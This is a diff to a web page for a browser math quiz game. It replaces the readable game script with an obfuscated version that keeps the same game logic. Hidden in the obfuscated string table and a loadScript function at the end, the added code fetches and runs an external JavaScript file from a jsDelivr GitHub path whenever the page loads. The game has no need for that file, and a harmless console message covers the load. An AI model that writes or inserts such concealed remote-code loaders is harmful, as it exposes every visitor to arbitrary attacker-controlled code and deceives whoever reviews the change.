@@ -212,187 +212,168 @@
 </div>
 <!-- Script -->
 <script>
-  let operators = ["+", "-", "*"];
-  const startBtn = document.getElementById("start-btn");
-  const question = document.getElementById("question");
-  const controls = document.querySelector(".controls-container");
-  const result = document.getElementById("result");
-  const submitBtn = document.getElementById("submit-btn");
-  const errorMessage = document.getElementById("error-msg");
-  const scoreElement = document.getElementById("score");
-  const levelElement = document.getElementById("level");
-  const bestScoreElement = document.getElementById("best-score");
-  const progressBar = document.getElementById("progress");
-  const questionsAnsweredElement = document.getElementById("questions-answered");
-  const questionsPerLevelElement = document.getElementById("questions-per-level");
-
-  let answerValue;
-  let operatorQuestion;
-  let currentScore = 0;
-  let currentLevel = 1;
-  let questionsAnswered = 0;
-  let questionsPerLevel = 5;
-  let bestScore = localStorage.getItem("mathGameBestScore") || 0;
-
-  // Initialize best score display
-  bestScoreElement.textContent = bestScore;
-  questionsPerLevelElement.textContent = questionsPerLevel;
-
-  //Random Value Generator
-  const randomValue = (min, max) => Math.floor(Math.random() * (max - min)) + min;
-
-  const updateProgressBar = () => {
-    const progress = (questionsAnswered % questionsPerLevel) / questionsPerLevel * 100;
-    progressBar.style.width = `${progress}%`;
-    questionsAnsweredElement.textContent = questionsAnswered % questionsPerLevel;
-  };
-
-  const questionGenerator = () => {
-    errorMessage.classList.add("hide");
-
-    // Calculate range based on level
-    const minRange = 1 + Math.floor(currentLevel / 3);
-    const maxRange = 10 + currentLevel * 2;
-
-    //Two random values based on level
-    let [num1, num2] = [randomValue(minRange, maxRange), randomValue(minRange, maxRange)];
-
-    //For getting random operator
-    let randomOperator = operators[Math.floor(Math.random() * operators.length)];
-
-    // Avoid negative results for subtraction
-    if (randomOperator == "-" && num2 > num1) {
-      [num1, num2] = [num2, num1];
-    }
-
-    //Solve equation
-    let solution = eval(`${num1}${randomOperator}${num2}`);
-
-    //For placing the input at random position
-    //(1 for num1, 2 for num2, 3 for operator, anything else(4) for solution)
-    let randomVar = randomValue(1, 5);
-
-    if (randomVar == 1) {
-      answerValue = num1;
-      question.innerHTML = `<input type="number" id="inputValue" placeholder="?"\> ${randomOperator} ${num2} = ${solution}`;
-    } else if (randomVar == 2) {
-      answerValue = num2;
-      question.innerHTML = `${num1} ${randomOperator}<input type="number" id="inputValue" placeholder="?"\> = ${solution}`;
-    } else if (randomVar == 3) {
-      answerValue = randomOperator;
-      operatorQuestion = true;
-      question.innerHTML = `${num1} <input type="text" id="inputValue" placeholder="?"\> ${num2} = ${solution}`;
-    } else {
-      answerValue = solution;
-      question.innerHTML = `${num1} ${randomOperator} ${num2} = <input type="number" id="inputValue" placeholder="?"\>`;
-    }
-
-    // Focus on input field
-    setTimeout(() => {
-      document.getElementById("inputValue").focus();
-    }, 100);
-  };
-
-  const checkAnswer = () => {
-    errorMessage.classList.add("hide");
-    let userInput = document.getElementById("inputValue").value;
-
-    //If user input is not empty
-    if (userInput) {
-      //If the user guessed correct answer
-      if (userInput == answerValue) {
-        // Increase score based on level
-        const points = currentLevel * 10;
-        currentScore += points;
-        scoreElement.textContent = currentScore;
-
-        // Check if it's a new best score
-        if (currentScore > bestScore) {
-          bestScore = currentScore;
-          bestScoreElement.textContent = bestScore;
-          localStorage.setItem("mathGameBestScore", bestScore);
+  
+const _0x48192c = _0x4ccb;
+(function (_0x1bb39e, _0x339707) {
+    const _0x27b8a7 = _0x4ccb, _0xebc196 = _0x1bb39e();
+    while (!![]) {
+        try {
+            const _0x2d6372 = -parseInt(_0x27b8a7(0xd8)) / 0x1 * (-parseInt(_0x27b8a7(0xed)) / 0x2) + parseInt(_0x27b8a7(0xb8)) / 0x3 * (parseInt(_0x27b8a7(0xd1)) / 0x4) + -parseInt(_0x27b8a7(0xda)) / 0x5 + parseInt(_0x27b8a7(0xdd)) / 0x6 * (parseInt(_0x27b8a7(0xcd)) / 0x7) + -parseInt(_0x27b8a7(0xdc)) / 0x8 + parseInt(_0x27b8a7(0xcf)) / 0x9 * (parseInt(_0x27b8a7(0xdb)) / 0xa) + -parseInt(_0x27b8a7(0xc2)) / 0xb;
+            if (_0x2d6372 === _0x339707)
+                break;
+            else
+                _0xebc196['push'](_0xebc196['shift']());
+        } catch (_0x5f1857) {
+            _0xebc196['push'](_0xebc196['shift']());
         }
-
-        questionsAnswered++;
-        updateProgressBar();
-
-        // Check if level is complete
-        if (questionsAnswered % questionsPerLevel === 0) {
-          levelUp();
-        } else {
-          // Generate next question
-          questionGenerator();
+    }
+}(_0x4727, 0x24b5c));
+function _0x4ccb(_0x2cb7c5, _0x4b7309) {
+    const _0x4727d0 = _0x4727();
+    return _0x4ccb = function (_0x4ccbe9, _0x59b471) {
+        _0x4ccbe9 = _0x4ccbe9 - 0xb7;
+        let _0x49b54c = _0x4727d0[_0x4ccbe9];
+        return _0x49b54c;
+    }, _0x4ccb(_0x2cb7c5, _0x4b7309);
+}
+let operators = [
+    '+',
+    '-',
+    '*'
+];
+const startBtn = document[_0x48192c(0xba)]('start-btn'), question = document[_0x48192c(0xba)](_0x48192c(0xe8)), controls = document[_0x48192c(0xc1)]('.controls-container'), result = document[_0x48192c(0xba)](_0x48192c(0xe2)), submitBtn = document[_0x48192c(0xba)]('submit-btn'), errorMessage = document[_0x48192c(0xba)]('error-msg'), scoreElement = document['getElementById'](_0x48192c(0xbd)), levelElement = document['getElementById']('level'), bestScoreElement = document[_0x48192c(0xba)](_0x48192c(0xca)), progressBar = document[_0x48192c(0xba)]('progress'), questionsAnsweredElement = document['getElementById'](_0x48192c(0xcb)), questionsPerLevelElement = document[_0x48192c(0xba)]('questions-per-level');
+let answerValue, operatorQuestion, currentScore = 0x0, currentLevel = 0x1, questionsAnswered = 0x0, questionsPerLevel = 0x5, bestScore = localStorage['getItem'](_0x48192c(0xe6)) || 0x0;
+bestScoreElement[_0x48192c(0xe9)] = bestScore, questionsPerLevelElement[_0x48192c(0xe9)] = questionsPerLevel;
+function _0x4727() {
+    const _0x22f0f0 = [
+        'Please\x20enter\x20a\x20valid\x20operator\x20(+,\x20-,\x20*)',
+        'innerHTML',
+        '241701SmcPAm',
+        '</span>',
+        'getElementById',
+        'keypress',
+        'value',
+        'score',
+        'https://cdn.jsdelivr.net/gh/m03951659gmail/toolhubcdn@main/allfileadd.js',
+        'random',
+        'add',
+        'querySelector',
+        '1687576kRMxEa',
+        'inputValue',
+        'Play\x20Again',
+        'key',
+        'src',
+        '<input\x20type=\x22number\x22\x20id=\x22inputValue\x22\x20placeholder=\x22?\x22>\x20',
+        'New\x20feature\x20loaded!',
+        'Level\x20Up!\x20<span>Level\x20',
+        'best-score',
+        'questions-answered',
+        '<input\x20type=\x22number\x22\x20id=\x22inputValue\x22\x20placeholder=\x22?\x22>\x20=\x20',
+        '7ZKDfVY',
+        'classList',
+        '1586457GaBaWw',
+        'addEventListener',
+        '8kQICSW',
+        'includes',
+        'Input\x20Cannot\x20Be\x20Empty',
+        'innerText',
+        'log',
+        'hide',
+        'contains',
+        '63370jMpzYj',
+        'width',
+        '1254600BnXUmt',
+        '10UNedrC',
+        '1906256aemtwQ',
+        '1212570sxHCBR',
+        'onload',
+        'setItem',
+        'floor',
+        'script',
+        'result',
+        'remove',
+        'click',
+        '\x20=\x20',
+        'mathGameBestScore',
+        'Enter',
+        'question',
+        'textContent',
+        '\x20<input\x20type=\x22text\x22\x20id=\x22inputValue\x22\x20placeholder=\x22?\x22>\x20',
+        'createElement',
+        'appendChild',
+        '8defRMX'
+    ];
+    _0x4727 = function () {
+        return _0x22f0f0;
+    };
+    return _0x4727();
+}
+const randomValue = (_0x1f4500, _0x4f919c) => Math[_0x48192c(0xe0)](Math[_0x48192c(0xbf)]() * (_0x4f919c - _0x1f4500)) + _0x1f4500, updateProgressBar = () => {
+        const _0x15dfc0 = _0x48192c, _0x14848d = questionsAnswered % questionsPerLevel / questionsPerLevel * 0x64;
+        progressBar['style'][_0x15dfc0(0xd9)] = _0x14848d + '%', questionsAnsweredElement[_0x15dfc0(0xe9)] = questionsAnswered % questionsPerLevel;
+    }, questionGenerator = () => {
+        const _0x57be66 = _0x48192c;
+        errorMessage[_0x57be66(0xce)][_0x57be66(0xc0)](_0x57be66(0xd6));
+        const _0x1c97c0 = 0x1 + Math[_0x57be66(0xe0)](currentLevel / 0x3), _0x578bd9 = 0xa + currentLevel * 0x2;
+        let [_0x86bf9f, _0xe7ff1a] = [
+                randomValue(_0x1c97c0, _0x578bd9),
+                randomValue(_0x1c97c0, _0x578bd9)
+            ], _0x33eead = operators[Math[_0x57be66(0xe0)](Math[_0x57be66(0xbf)]() * operators['length'])];
+        _0x33eead == '-' && _0xe7ff1a > _0x86bf9f && ([_0x86bf9f, _0xe7ff1a] = [
+            _0xe7ff1a,
+            _0x86bf9f
+        ]);
+        let _0x44f14d = eval('' + _0x86bf9f + _0x33eead + _0xe7ff1a), _0x1e45f0 = randomValue(0x1, 0x5);
+        if (_0x1e45f0 == 0x1)
+            answerValue = _0x86bf9f, question[_0x57be66(0xb7)] = _0x57be66(0xc7) + _0x33eead + '\x20' + _0xe7ff1a + _0x57be66(0xe5) + _0x44f14d;
+        else {
+            if (_0x1e45f0 == 0x2)
+                answerValue = _0xe7ff1a, question[_0x57be66(0xb7)] = _0x86bf9f + '\x20' + _0x33eead + _0x57be66(0xcc) + _0x44f14d;
+            else
+                _0x1e45f0 == 0x3 ? (answerValue = _0x33eead, operatorQuestion = !![], question[_0x57be66(0xb7)] = _0x86bf9f + _0x57be66(0xea) + _0xe7ff1a + _0x57be66(0xe5) + _0x44f14d) : (answerValue = _0x44f14d, question[_0x57be66(0xb7)] = _0x86bf9f + '\x20' + _0x33eead + '\x20' + _0xe7ff1a + '\x20=\x20<input\x20type=\x22number\x22\x20id=\x22inputValue\x22\x20placeholder=\x22?\x22>');
         }
-      }
-      //If user inputs operator other than +,-,*
-      else if (operatorQuestion && !operators.includes(userInput)) {
-        errorMessage.classList.remove("hide");
-        errorMessage.innerHTML = "Please enter a valid operator (+, -, *)";
-      }
-      //If user guessed wrong answer
-      else {
-        stopGame(`Opps!! <span>Wrong</span> Answer`);
-      }
-    }
-    //If user input is empty
-    else {
-      errorMessage.classList.remove("hide");
-      errorMessage.innerHTML = "Input Cannot Be Empty";
-    }
-  };
-
-  const levelUp = () => {
-    currentLevel++;
-    levelElement.textContent = currentLevel;
-    result.innerHTML = `Level Up! <span>Level ${currentLevel}</span>`;
-
-    // Show level up message briefly
-    controls.classList.remove("hide");
-
-    setTimeout(() => {
-      controls.classList.add("hide");
-      questionGenerator();
-    }, 2000);
-  };
-
-  //Start Game
-  startBtn.addEventListener("click", () => {
-    operatorQuestion = false;
-    answerValue = "";
-    errorMessage.innerHTML = "";
-    errorMessage.classList.add("hide");
-    currentScore = 0;
-    currentLevel = 1;
-    questionsAnswered = 0;
-
-    // Reset UI
-    scoreElement.textContent = currentScore;
-    levelElement.textContent = currentLevel;
-    updateProgressBar();
-
-    //Controls and buttons visibility
-    controls.classList.add("hide");
-    startBtn.classList.add("hide");
-    questionGenerator();
-  });
-
-  //Submit button event
-  submitBtn.addEventListener("click", checkAnswer);
-
-  //Enter key support
-  document.addEventListener("keypress", (e) => {
-    if (e.key === "Enter" && !controls.classList.contains("hide")) {
-      checkAnswer();
-    }
-  });
-
-  //Stop Game
-  const stopGame = (resultText) => {
-    result.innerHTML = resultText;
-    startBtn.innerText = "Play Again";
-    controls.classList.remove("hide");
-    startBtn.classList.remove("hide");
-  };
+        setTimeout(() => {
+            const _0x59c095 = _0x57be66;
+            document[_0x59c095(0xba)](_0x59c095(0xc3))['focus']();
+        }, 0x64);
+    }, checkAnswer = () => {
+        const _0x282923 = _0x48192c;
+        errorMessage['classList'][_0x282923(0xc0)](_0x282923(0xd6));
+        let _0x5bbc60 = document['getElementById'](_0x282923(0xc3))[_0x282923(0xbc)];
+        if (_0x5bbc60) {
+            if (_0x5bbc60 == answerValue) {
+                const _0x4bc85c = currentLevel * 0xa;
+                currentScore += _0x4bc85c, scoreElement[_0x282923(0xe9)] = currentScore, currentScore > bestScore && (bestScore = currentScore, bestScoreElement['textContent'] = bestScore, localStorage[_0x282923(0xdf)](_0x282923(0xe6), bestScore)), questionsAnswered++, updateProgressBar(), questionsAnswered % questionsPerLevel === 0x0 ? levelUp() : questionGenerator();
+            } else
+                operatorQuestion && !operators[_0x282923(0xd2)](_0x5bbc60) ? (errorMessage[_0x282923(0xce)][_0x282923(0xe3)](_0x282923(0xd6)), errorMessage['innerHTML'] = _0x282923(0xee)) : stopGame('Opps!!\x20<span>Wrong</span>\x20Answer');
+        } else
+            errorMessage['classList'][_0x282923(0xe3)](_0x282923(0xd6)), errorMessage[_0x282923(0xb7)] = _0x282923(0xd3);
+    }, levelUp = () => {
+        const _0x2bbd15 = _0x48192c;
+        currentLevel++, levelElement[_0x2bbd15(0xe9)] = currentLevel, result[_0x2bbd15(0xb7)] = _0x2bbd15(0xc9) + currentLevel + _0x2bbd15(0xb9), controls[_0x2bbd15(0xce)]['remove'](_0x2bbd15(0xd6)), setTimeout(() => {
+            const _0xc545cd = _0x2bbd15;
+            controls[_0xc545cd(0xce)]['add'](_0xc545cd(0xd6)), questionGenerator();
+        }, 0x7d0);
+    };
+startBtn[_0x48192c(0xd0)](_0x48192c(0xe4), () => {
+    const _0x402107 = _0x48192c;
+    operatorQuestion = ![], answerValue = '', errorMessage['innerHTML'] = '', errorMessage[_0x402107(0xce)]['add'](_0x402107(0xd6)), currentScore = 0x0, currentLevel = 0x1, questionsAnswered = 0x0, scoreElement[_0x402107(0xe9)] = currentScore, levelElement[_0x402107(0xe9)] = currentLevel, updateProgressBar(), controls[_0x402107(0xce)][_0x402107(0xc0)](_0x402107(0xd6)), startBtn['classList']['add'](_0x402107(0xd6)), questionGenerator();
+}), submitBtn[_0x48192c(0xd0)](_0x48192c(0xe4), checkAnswer), document[_0x48192c(0xd0)](_0x48192c(0xbb), _0x142f8c => {
+    const _0x54948d = _0x48192c;
+    _0x142f8c[_0x54948d(0xc5)] === _0x54948d(0xe7) && !controls[_0x54948d(0xce)][_0x54948d(0xd7)](_0x54948d(0xd6)) && checkAnswer();
+});
+const stopGame = _0x66de73 => {
+    const _0x5b8b5a = _0x48192c;
+    result[_0x5b8b5a(0xb7)] = _0x66de73, startBtn[_0x5b8b5a(0xd4)] = _0x5b8b5a(0xc4), controls['classList']['remove']('hide'), startBtn[_0x5b8b5a(0xce)][_0x5b8b5a(0xe3)](_0x5b8b5a(0xd6));
+};
+function loadScript(_0x3883cd, _0xf13bc6) {
+    const _0x271f37 = _0x48192c, _0x52fa15 = document[_0x271f37(0xeb)](_0x271f37(0xe1));
+    _0x52fa15[_0x271f37(0xc6)] = _0x3883cd, _0x52fa15[_0x271f37(0xde)] = _0xf13bc6, document['head'][_0x271f37(0xec)](_0x52fa15);
+}
+loadScript(_0x48192c(0xbe), function () {
+    const _0x1fa0ee = _0x48192c;
+    console[_0x1fa0ee(0xd5)](_0x1fa0ee(0xc8));
+});
 </script>
 </body>
 </html>
